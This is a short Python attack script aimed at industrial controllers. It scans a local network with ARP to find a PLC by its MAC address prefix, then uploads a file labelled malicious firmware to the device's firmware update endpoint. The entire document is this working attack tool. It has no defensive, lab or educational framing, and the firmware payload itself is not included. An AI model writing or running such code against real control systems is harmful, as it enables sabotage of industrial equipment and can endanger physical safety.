import scapy.all as scapy
import requests
import time

# Step 1: Discover the PLC's IP address
def discover_plc_ip(network_range):
    print(f"[*] Scanning network {network_range} for PLC...")
    arp_request = scapy.ARP(pdst=network_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    plc_ip = None
    for element in answered_list:
        ip = element[1].psrc
        mac = element[1].hwsrc
        print(f"[+] Found device: IP={ip}, MAC={mac}")
        # Assuming the PLC has a specific MAC prefix (e.g., 00:1D:9C)
        if mac.startswith("00:1D:9C"):
            plc_ip = ip
            print(f"[+] PLC found at IP: {plc_ip}")
            break

    if not plc_ip:
        print("[-] PLC not found on the network.")
        exit(1)
    
    return plc_ip

# Step 2: Exploit the firmware update feature
def upload_malicious_firmware(plc_ip, firmware_file):
    url = f"http://{plc_ip}/firmware_update"
    print(f"[*] Uploading malicious firmware to {url}...")
    
    try:
        with open(firmware_file, 'rb') as f:
            files = {'file': f}
            response = requests.post(url, files=files)
        
        if response.status_code == 200:
            print("[+] Firmware update successful!")
        else:
            print(f"[-] Firmware update failed with status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error uploading firmware: {e}")

# Main function
if __name__ == "__main__":
    # Define the network range and malicious firmware file
    network_range = "192.168.1.0/24"
    malicious_firmware = "malicious_firmware.bin"

    # Discover the PLC's IP address
    plc_ip = discover_plc_ip(network_range)

    # Upload malicious firmware to the PLC
    upload_malicious_firmware(plc_ip, malicious_firmware)